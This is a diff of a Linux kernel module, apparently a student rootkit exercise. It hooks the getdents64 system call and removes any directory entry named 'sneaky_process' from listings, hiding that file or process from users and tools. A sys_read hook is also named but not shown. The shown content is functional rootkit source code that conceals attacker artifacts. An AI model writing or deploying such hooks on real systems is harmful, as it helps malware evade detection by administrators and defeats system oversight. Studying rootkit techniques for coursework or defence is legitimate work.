@@ -12,27 +12,17 @@
 
 #include <linux/unistd.h>        // for system call constants
 #include <linux/version.h>
-#include <linux/dirent.h>      // Contains dirent structs etc
+//#include <linux/dirent.h>      // Contains dirent structs etc
 
-
-#define _GNU_SOURCE
-#include <dirent.h>     /* Defines DT_* constants */
-#include <fcntl.h>
-#include <stdint.h>
-#include <stdio.h>
-#include <unistd.h>
-#include <stdlib.h>
-#include <sys/stat.h>
-#include <sys/syscall.h>
 
 #define PREFIX "sneaky_process"
 
-#define handle_error(msg) \
-               do { perror(msg); exit(EXIT_FAILURE); } while (0)
+// #define handle_error(msg) \
+//                do { perror(msg); exit(EXIT_FAILURE); } while (0)
 
 struct linux_dirent64 {
-               ino64_t        d_ino;    /* 64-bit inode number */
-               off64_t        d_off;    /* 64-bit offset to next structure */
+               u64        d_ino;    /* 64-bit inode number */
+               s64        d_off;    /* 64-bit offset to next structure */
                unsigned short d_reclen; /* Size of this dirent */
                unsigned char  d_type;   /* File type */
                char           d_name[]; /* Filename (null-terminated) */
@@ -83,26 +73,23 @@ asmlinkage int sneaky_sys_getdents64(int fd, void *dirp, size_t count)
   // Implement the sneaky part here
   nread = original_getdents64(fd, dirp, count);
   if (nread == -1)
-    handle_error("getdents");
+    //handle_error("getdents");
+    return 0;
   if (nread == 0)
     return 0;
-
-  for(long bpos = 0; bpos < nread;){
-    d = (struct linux_dirent64 *) (buf + bpos);
-    printf("%8ld  ", d->d_ino);
-    d_type = *(buf + bpos + d->d_reclen - 1);
-    printf("%-10s ", (d_type == DT_REG) ?  "regular" :
-                    (d_type == DT_DIR) ?  "directory" :
-                    (d_type == DT_FIFO) ? "FIFO" :
-                    (d_type == DT_SOCK) ? "socket" :
-                    (d_type == DT_LNK) ?  "symlink" :
-                    (d_type == DT_BLK) ?  "block dev" :
-                    (d_type == DT_CHR) ?  "char dev" : "???");
-    printf("%4d %10jd  %s\n", d->d_reclen,
-            (intmax_t) d->d_off, d->d_name);
-    bpos += d->d_reclen;
+  struct linux_dirent64 *d;
+  long bpos = 0;
+  for(; bpos < nread;){
+    d = (struct linux_dirent64 *) ((char*)dirp + bpos);
+    if(strcmp(d->d_name, "sneaky_process") == 0){
+      memmove((char*)dirp + bpos, (char*)dirp + bpos + d->d_reclen, nread - (bpos + d->d_reclen));
+      nread -= d->d_reclen;
+    }
+    else{
+      bpos += d->d_reclen;
+    }
   }
-  return 0;
+  return nread;
 }
 
 asmlinkage int sneaky_sys_read(int fd, void *buf, size_t count)
